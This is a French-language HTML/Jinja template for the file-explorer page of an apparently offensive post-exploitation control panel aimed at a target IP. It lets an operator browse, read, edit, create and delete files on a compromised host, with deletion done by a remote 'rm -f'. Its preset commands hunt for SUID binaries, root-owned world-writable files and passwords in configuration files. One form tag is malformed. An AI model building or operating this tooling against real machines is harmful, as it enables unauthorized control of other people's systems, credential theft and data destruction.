{% extends "base.html" %}

{% block content %}
<div class="container mt-4">
    <div class="d-flex justify-content-between align-items-center mb-4">
        <h1>Explorateur de fichiers</h1>
        <div>
            <a href="{{ url_for('post_exploit.dashboard', target_ip=target_ip) }}" class="btn btn-primary">
                <i class="fas fa-arrow-left"></i> Retour au tableau de bord
            </a>
            <span class="badge bg-success">Cible: {{ target_ip }}</span>
        </div>
    </div>

    <div class="card mb-4">
        <div class="card-header bg-primary text-white">
            <div class="d-flex justify-content-between align-items-center">
                <div>
                    <i class="fas fa-folder-open"></i> Répertoire: <span id="current-path">{{ path }}</span>
                </div>
                <div class="input-group" style="max-width: 300px;">
                    <input type="text" id="path-input" class="form-control" value="{{ path }}">
                    <button class="btn btn-light" id="go-path"><i class="fas fa-arrow-right"></i></button>
                </div>
            </div>
        </div>
        <div class="card-body">
            {% if result.error %}
            <div class="alert alert-danger">
                <i class="fas fa-exclamation-triangle"></i> Erreur: {{ result.error }}
            </div>
            {% elif operation == 'list' and result.files %}
            <div class="table-responsive">
                <table class="table table-striped table-hover">
                    <thead>
                        <tr>
                            <th>Type</th>
                            <th>Nom</th>
                            <th>Permissions</th>
                            <th>Taille</th>
                            <th>Propriétaire</th>
                            <th>Date</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- Lien vers le répertoire parent -->
                        <tr>
                            <td><i class="fas fa-level-up-alt"></i></td>
                            <td>
                                <a href="{{ url_for('post_exploit.file_operations', operation='list', path=path|dirname, target_ip=target_ip) }}">
                                    ..
                                </a>
                            </td>
                            <td colspan="5"></td>
                        </tr>
                        
                        {% for file in result.files %}
                        <tr>
                            <td>
                                {% if file.permissions.startswith('d') %}
                                <i class="fas fa-folder text-warning"></i>
                                {% elif file.permissions.startswith('l') %}
                                <i class="fas fa-link text-info"></i>
                                {% else %}
                                <i class="fas fa-file text-secondary"></i>
                                {% endif %}
                            </td>
                            <td>
                                {% if file.permissions.startswith('d') %}
                                <a href="{{ url_for('post_exploit.file_operations', operation='list', path=path + '/' + file.name, target_ip=target_ip) }}">
                                    {{ file.name }}
                                </a>
                                {% else %}
                                <a href="{{ url_for('post_exploit.file_operations', operation='read', path=path + '/' + file.name, target_ip=target_ip) }}">
                                    {{ file.name }}
                                </a>
                                {% endif %}
                            </td>
                            <td>{{ file.permissions }}</td>
                            <td>{{ file.size }}</td>
                            <td>{{ file.owner }}</td>
                            <td>{{ file.date }}</td>
                            <td>
                                <div class="btn-group btn-group-sm">
                                    {% if not file.permissions.startswith('d') %}
                                    <a href="{{ url_for('post_exploit.file_operations', operation='read', path=path + '/' + file.name, target_ip=target_ip) }}" class="btn btn-primary">
                                        <i class="fas fa-eye"></i>
                                    </a>
                                    {% endif %}
                                    <button class="btn btn-danger delete-file" data-path="{{ path + '/' + file.name }}">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </div>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            {% elif operation == 'read' and result.content %}
            <div class="mb-3">
                <a href="{{ url_for('post_exploit.file_operations', operation='list', path=path|dirname, target_ip=target_ip) }}" class="btn btn-secondary">
                    <i class="fas fa-arrow-left"></i> Retour au répertoire
                </a>
                <button class="btn btn-primary" id="edit-button">
                    <i class="fas fa-edit"></i> Éditer
                </button>
            </div>
            
            <div id="view-mode">
                <pre class="bg-light p-3">{{ result.content }}</pre>
            </div>
            
            <div id="edit-mode" style="display: none;">
                <form id="edit-form">
                    <div class="mb-3">
                        <textarea id="file-content" class="form-control" rows="15">{{ result.content }}</textarea>
                    </div>
                    <div class="mb-3<div class="mb-3">
                        <button type="submit" class="btn btn-success">
                            <i class="fas fa-save"></i> Enregistrer
                        </button>
                        <button type="button" id="cancel-edit" class="btn btn-secondary">
                            <i class="fas fa-times"></i> Annuler
                        </button>
                    </div>
                </form>
            </div>
            {% else %}
            <div class="alert alert-info">
                <i class="fas fa-info-circle"></i> Aucun contenu à afficher.
            </div>
            {% endif %}
        </div>
    </div>

    <div class="card mb-4">
        <div class="card-header bg-success text-white">
            <i class="fas fa-upload"></i> Téléverser un fichier
        </div>
        <div class="card-body">
            <form id="upload-form">
                <div class="mb-3">
                    <label for="file-content-upload" class="form-label">Contenu du fichier</label>
                    <textarea id="file-content-upload" name="content" class="form-control" rows="5" placeholder="Entrez le contenu du fichier ici..."></textarea>
                </div>
                <div class="mb-3">
                    <label for="file-path-upload" class="form-label">Chemin de destination</label>
                    <input type="text" id="file-path-upload" name="path" class="form-control" value="{{ path }}/nouveau_fichier.txt">
                </div>
                <input type="hidden" name="operation" value="write">
                <input type="hidden" name="target_ip" value="{{ target_ip }}">
                <button type="submit" class="btn btn-success">
                    <i class="fas fa-save"></i> Créer le fichier
                </button>
            </form>
        </div>
    </div>

    <div class="card mb-4">
        <div class="card-header bg-info text-white">
            <i class="fas fa-terminal"></i> Commandes utiles
        </div>
        <div class="card-body">
            <div class="list-group">
                <a href="#" class="list-group-item list-group-item-action command-link" data-command="find {{ path }} -type f -name '*.conf' -o -name '*.cfg' | head -10">
                    <i class="fas fa-chevron-right"></i> Fichiers de configuration
                </a>
                <a href="#" class="list-group-item list-group-item-action command-link" data-command="find {{ path }} -type f -perm -4000 -ls 2>/dev/null">
                    <i class="fas fa-chevron-right"></i> Fichiers SUID
                </a>
                <a href="#" class="list-group-item list-group-item-action command-link" data-command="find {{ path }} -type f -user root -perm -o+w -ls 2>/dev/null">
                    <i class="fas fa-chevron-right"></i> Fichiers accessibles en écriture
                </a>
                <a href="#" class="list-group-item list-group-item-action command-link" data-command="grep -l 'password' {{ path }}/*.conf 2>/dev/null">
                    <i class="fas fa-chevron-right"></i> Recherche de mots de passe
                </a>
                <a href="#" class="list-group-item list-group-item-action command-link" data-command="find {{ path }} -type f -name '*.log' | head -10">
                    <i class="fas fa-chevron-right"></i> Fichiers journaux
                </a>
            </div>
        </div>
    </div>

    <div class="card">
        <div class="card-header bg-dark text-white">
            <i class="fas fa-terminal"></i> Résultat de la commande
        </div>
        <div class="card-body">
            <pre id="command-output" class="bg-dark text-light p-3" style="min-height: 200px;">Cliquez sur une commande ci-dessus pour l'exécuter...</pre>
        </div>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const commandLinks = document.querySelectorAll('.command-link');
    const commandOutput = document.getElementById('command-output');
    const editButton = document.getElementById('edit-button');
    const cancelEdit = document.getElementById('cancel-edit');
    const viewMode = document.getElementById('view-mode');
    const editMode = document.getElementById('edit-mode');
    const editForm = document.getElementById('edit-form');
    const uploadForm = document.getElementById('upload-form');
    const deleteButtons = document.querySelectorAll('.delete-file');
    const pathInput = document.getElementById('path-input');
    const goPathButton = document.getElementById('go-path');
    
    // Navigation directe
    if (goPathButton && pathInput) {
        goPathButton.addEventListener('click', function() {
            const path = pathInput.value.trim();
            if (path) {
                window.location.href = "{{ url_for('post_exploit.file_operations', operation='list', path='PATH_PLACEHOLDER', target_ip=target_ip) }}".replace('PATH_PLACEHOLDER', path);
            }
        });
        
        pathInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                goPathButton.click();
            }
        });
    }
    
    // Édition de fichier
    if (editButton && viewMode && editMode) {
        editButton.addEventListener('click', function() {
            viewMode.style.display = 'none';
            editMode.style.display = 'block';
        });
    }
    
    if (cancelEdit && viewMode && editMode) {
        cancelEdit.addEventListener('click', function() {
            viewMode.style.display = 'block';
            editMode.style.display = 'none';
        });
    }
    
    if (editForm) {
        editForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const content = document.getElementById('file-content').value;
            
            // Envoyer la demande d'écriture
            fetch("{{ url_for('post_exploit.file_operations') }}", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    operation: 'write',
                    path: "{{ path }}",
                    content: content,
                    target_ip: "{{ target_ip }}"
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Fichier enregistré avec succès');
                    // Recharger la page pour afficher le contenu mis à jour
                    location.reload();
                } else {
                    alert(`Erreur: ${data.error}`);
                }
            })
            .catch(error => {
                alert(`Erreur de connexion: ${error}`);
            });
        });
    }
    
    // Téléversement de fichier
    if (uploadForm) {
        uploadForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const content = document.getElementById('file-content-upload').value;
            const path = document.getElementById('file-path-upload').value;
            
            // Envoyer la demande d'écriture
            fetch("{{ url_for('post_exploit.file_operations') }}", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    operation: 'write',
                    path: path,
                    content: content,
                    target_ip: "{{ target_ip }}"
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Fichier créé avec succès');
                    // Recharger la page pour afficher le contenu mis à jour
                    location.reload();
                } else {
                    alert(`Erreur: ${data.error}`);
                }
            })
            .catch(error => {
                alert(`Erreur de connexion: ${error}`);
            });
        });
    }
    
    // Suppression de fichier
    if (deleteButtons) {
        deleteButtons.forEach(button => {
            button.addEventListener('click', function() {
                const path = this.getAttribute('data-path');
                if (confirm(`Êtes-vous sûr de vouloir supprimer ${path} ?`)) {
                    // Utilisation de la commande rm pour supprimer le fichier
                    fetch("{{ url_for('post_exploit.execute_command') }}", {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            command: `rm -f "${path}"`,
                            target_ip: "{{ target_ip }}"
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            alert('Fichier supprimé avec succès');
                            // Recharger la page pour mettre à jour la liste
                            location.reload();
                        } else {
                            alert(`Erreur: ${data.result}`);
                        }
                    })
                    .catch(error => {
                        alert(`Erreur de connexion: ${error}`);
                    });
                }
            });
        });
    }
    
    // Commandes
    commandLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const command = this.getAttribute('data-command');
            commandOutput.textContent = `Exécution de la commande: ${command}...`;
            
            // Envoyer la commande au serveur
            fetch("{{ url_for('post_exploit.execute_command') }}", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    command: command,
                    target_ip: "{{ target_ip }}"
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    commandOutput.textContent = data.result;
                } else {
                    commandOutput.textContent = `Erreur: ${data.result}`;
                }
            })
            .catch(error => {
                commandOutput.textContent = `Erreur de connexion: ${error}`;
            });
        });
    });
});
</script>
{% endblock %}